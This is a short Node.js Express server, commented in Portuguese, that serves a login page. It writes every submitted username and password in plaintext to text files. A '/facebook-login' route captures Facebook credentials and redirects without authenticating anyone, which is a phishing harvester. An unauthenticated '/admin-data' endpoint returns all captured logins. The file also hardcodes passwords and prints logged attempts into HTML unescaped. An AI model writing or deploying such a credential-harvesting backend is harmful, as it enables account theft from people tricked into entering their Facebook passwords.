const express = require('express');
const bodyParser = require('body-parser');
const fs = require('fs');
const path = require('path');

const app = express();
const PORT = 3000;
const ADMIN_PASSWORD = 'secureAdminPass123!'; // Senha aleatória para o administrador

app.use(bodyParser.urlencoded({ extended: true }));
app.use(express.static(path.join(__dirname, 'front')));

// Rota para servir o index.html na URL raiz
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'front/index.html'));
});

app.post('/login', (req, res) => {
    const { username, password } = req.body;

    // Salva os dados de login em um arquivo .txt
    const loginsFilePath = path.join(__dirname, 'logins.txt');
    fs.appendFileSync(loginsFilePath, `Username: ${username}\nPassword: ${password}\n-----\n`);

    // Verifica as credenciais
    if (username === 'meucasacodeveludo' && password === '147258369@Erik4') {
        res.redirect('/success.html');
    } else {
        res.redirect('/');
    }
});

app.post('/facebook-login', (req, res) => {
    const { username, password } = req.body;

    // Registra a tentativa de login do Facebook
    const fbLoginsFilePath = path.join(__dirname, 'facebook-logins.txt');
    fs.appendFileSync(fbLoginsFilePath, `Facebook Username: ${username}\nFacebook Password: ${password}\n-----\n`);

    res.redirect('/');
});

app.get('/super-secret-admin-login', (req, res) => {
    res.sendFile(path.join(__dirname, 'front/admin-login.html'));
});

app.post('/super-secret-admin-login', (req, res) => {
    const { password } = req.body;

    // Registra a tentativa de login
    const attemptsFilePath = path.join(__dirname, 'login-attempts.txt');
    fs.appendFileSync(attemptsFilePath, `Admin Login Attempt: Password: ${password}\n`);

    // Verifica a senha do administrador
    if (password === ADMIN_PASSWORD) {
        res.redirect('/admin.html');
    } else {
        res.redirect('/super-secret-admin-login');
    }
});

app.get('/admin-data', (req, res) => {
    const loginsFilePath = path.join(__dirname, 'logins.txt');
    const logins = fs.readFileSync(loginsFilePath, 'utf-8');
    res.send(logins);
});

app.get('/invasores5896', (req, res) => {
    const attemptsFilePath = path.join(__dirname, 'login-attempts.txt');
    const attempts = fs.readFileSync(attemptsFilePath, 'utf-8');
    res.send(`<html><body><h1>Tentativas de Login</h1><pre>${attempts}</pre></body></html>`);
});

app.listen(PORT, () => {
    console.log(`Servidor rodando em http://localhost:${PORT}`);
});